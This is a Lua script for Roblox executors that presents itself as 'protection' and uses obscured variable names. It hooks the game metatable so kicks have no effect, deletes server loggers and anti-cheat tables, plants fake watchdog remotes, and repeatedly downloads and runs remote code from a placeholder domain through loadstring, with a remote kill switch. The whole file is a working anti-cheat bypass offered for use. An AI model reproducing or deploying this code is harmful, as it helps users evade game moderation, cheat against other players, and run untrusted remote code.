-- // FULL OBFUSCATED PROTECTION SCRIPT WITH MODULE TOGGLES //

local _O0yCYGS36UADF_ = game:GetService("Players").LocalPlayer
local _Zza81Ep5ck__ = _O0yCYGS36UADF_:WaitForChild("PlayerGui")
local _XxA9DsXkufVGg = game:GetService("RunService")
local _SAfVWu4b0D5GaUlI = game:GetService("ReplicatedStorage")
local _nY7KC6N1LWJf9W_ = game:GetService("TeleportService")
local _lIaID444rs8rUWhZlI = game:GetService("Workspace")
local _JxIZ9QQFJ3p9 = game:GetService("HttpService")

local function rvar(_lLen_) local _sS = "" for _i = 1, _lLen_ do local _mode = math.random(1,3) if _mode == 1 then _sS = _sS..string.char(math.random(65,90)) elseif _mode == 2 then _sS = _sS..string.char(math.random(97,122)) else _sS = _sS..tostring(math.random(0,9)) end end return _sS end
local function safeDestroy(_o) pcall(function() _o:Destroy() end) end

-- GUI INIT
local _gui = Instance.new("ScreenGui", _Zza81Ep5ck__)
_gui.Name = rvar(8)
_gui.ResetOnSpawn = false

local _alert = Instance.new("TextLabel", _gui)
_alert.Size = UDim2.new(0.6, 0, 0.035, 0)
_alert.Position = UDim2.new(0.2, 0, 0.01, 0)
_alert.BackgroundTransparency = 0.4
_alert.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
_alert.TextColor3 = Color3.fromRGB(255, 65, 65)
_alert.TextScaled = true
_alert.Visible = false
_alert.Text = "..."

local function warnUI(_msg)
	_alert.Text = "[Protector] ".._msg
	_alert.Visible = true
	task.delay(3, function() _alert.Visible = false end)
end

-- MODULE FLAGS
local _Modules = {
	["KickBlocker"] = true,
	["HeartbeatSpoof"] = true,
	["AntiLoggers"] = true,
	["AnticheatScanner"] = true,
	["FakeBots"] = true,
	["RemoteUpdater"] = true,
	["KillSwitch"] = true
}

-- GUI TOGGLES
local y = 0.05
for name, _ in pairs(_Modules) do
	local toggle = Instance.new("TextButton", _gui)
	toggle.Size = UDim2.new(0.2, 0, 0.035, 0)
	toggle.Position = UDim2.new(0.01, 0, y, 0)
	toggle.BackgroundColor3 = Color3.fromRGB(30,30,30)
	toggle.TextColor3 = Color3.fromRGB(255,255,255)
	toggle.TextScaled = true
	toggle.Text = name .. " ON"
	toggle.Name = name
	y = y + 0.04
	toggle.MouseButton1Click:Connect(function()
		_Modules[name] = not _Modules[name]
		toggle.Text = name .. ( _Modules[name] and " ON" or " OFF")
		warnUI(name .. " set to " .. tostring(_Modules[name]))
	end)
end

-- KICK BLOCK
if _Modules["KickBlocker"] then
	local _mt = getrawmetatable(game)
	setreadonly(_mt, false)
	local _orig = _mt.__namecall
	_mt.__namecall = newcclosure(function(self, ...)
		local _m = getnamecallmethod()
		if _m == "Kick" or tostring(self):lower():find("kick") then
			warnUI("Kick Blocked")
			return nil
		end
		return _orig(self, ...)
	end)
end

-- HEARTBEAT SPOOFER
if _Modules["HeartbeatSpoof"] then
	local _count = 0
	_XxA9DsXkufVGg.Heartbeat:Connect(function()
		_count += 1
		if _count % 180 == 0 then
			warnUI("Heartbeat Spoofed")
		end
	end)
end

-- REMOTE LOGGER KILLER
if _Modules["AntiLoggers"] then
	task.spawn(function()
		while true do task.wait(2)
			for _, _v in pairs(_SAfVWu4b0D5GaUlI:GetDescendants()) do
				local _n = tostring(_v.Name):lower()
				if _n:find("logger") or _n:find("hook") or _n:find("trace") then
					warnUI("Spy Removed: ".._n)
					safeDestroy(_v)
				end
			end
		end
	end)
end

-- ANTICHEAT KILL
if _Modules["AnticheatScanner"] then
	task.spawn(function()
		local _kw = {"anticheat", "checker", "ban", "kick", "flag"}
		while true do task.wait(4)
			for _, _obj in ipairs(getgc(true)) do
				if typeof(_obj) == "table" then
					for _k, _v in pairs(_obj) do
						if typeof(_k) == "string" and typeof(_v) ~= "function" then
							for _, _key in ipairs(_kw) do
								if _k:lower():find(_key) or tostring(_v):lower():find(_key) then
									_obj[_k] = nil
									warnUI("AC Wipe: ".._k)
								end
							end
						end
					end
				end
			end
		end
	end)
end

-- FAKE WATCHDOG BOTS
if _Modules["FakeBots"] then
	local _botFolder = Instance.new("Folder", _SAfVWu4b0D5GaUlI)
	_botFolder.Name = "FakeBot_"..rvar(5)
	for _i = 1, 2 do
		local _r = Instance.new("RemoteEvent", _botFolder)
		_r.Name = "Watchdog"..rvar(4)
		_r.OnServerEvent:Connect(function() end)
	end
	warnUI("Fake Bots Injected")
end

-- SCRIPT AUTO-RELOADER
_O0yCYGS36UADF_.OnTeleport:Connect(function()
	warnUI("Teleport Detected")
	loadstring(game:HttpGet("https://yourdomain.com/reload.lua"))()
end)

-- REMOTE SCRIPT UPDATER
if _Modules["RemoteUpdater"] then
	task.spawn(function()
		while true do task.wait(30)
			pcall(function()
				local _update = game:HttpGet("https://yourdomain.com/ronix_update.lua")
				loadstring(_update)()
			end)
		end
	end)
end

-- SERVER KILLSWITCH / HEARTBEAT
if _Modules["KillSwitch"] then
	task.spawn(function()
		while true do task.wait(15)
			local resp = _JxIZ9QQFJ3p9:GetAsync("https://yourdomain.com/ronix_heartbeat")
			if resp and resp:lower():find("terminate") then
				warnUI("Kill switch triggered")
				error("Killed by server")
			end
		end
	end)
end

warnUI("All Modules Loaded")
